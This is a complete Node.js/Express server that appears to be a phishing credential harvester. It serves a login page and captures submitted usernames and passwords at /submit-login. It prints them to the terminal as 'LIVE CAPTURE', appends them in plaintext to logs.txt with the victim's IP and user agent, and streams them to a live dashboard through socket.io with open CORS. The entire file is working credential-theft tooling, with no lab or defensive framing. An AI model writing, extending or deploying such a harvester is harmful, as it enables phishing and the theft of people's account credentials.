const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'logs.txt');

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve live dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Socket.io connection
io.on('connection', (socket) => {
  console.log('📱 Dashboard connected:', socket.id);
  socket.emit('status', 'Connected to live logs');
});

// Login capture - terminal + file + socket broadcast
app.post('/submit-login', (req, res) => {
  try {
    const { username, password } = req.body;
    
    // Terminal
    console.log('=== LIVE CAPTURE ===');
    console.log('Username:', username);
    console.log('Password:', password);
    console.log('====================');
    
    // File
    const logEntry = `${new Date().toISOString()},${username},${password},${req.ip},${req.get('User-Agent')}\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
    
    // Socket broadcast to dashboard
    const logData = {
      timestamp: new Date().toISOString(),
      username,
      password,
      ip: req.ip,
      userAgent: req.get('User-Agent')
    };
    io.emit('new-login', logData);
    
    res.json({ success: true, message: 'Login data received' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

server.listen(PORT, () => {
  console.log(`🚀 Server: http://localhost:${PORT}`);
  console.log(`📱 Login: http://localhost:${PORT}`);
  console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);  
  console.log('📄 Logs: logs.txt + live socket');
});
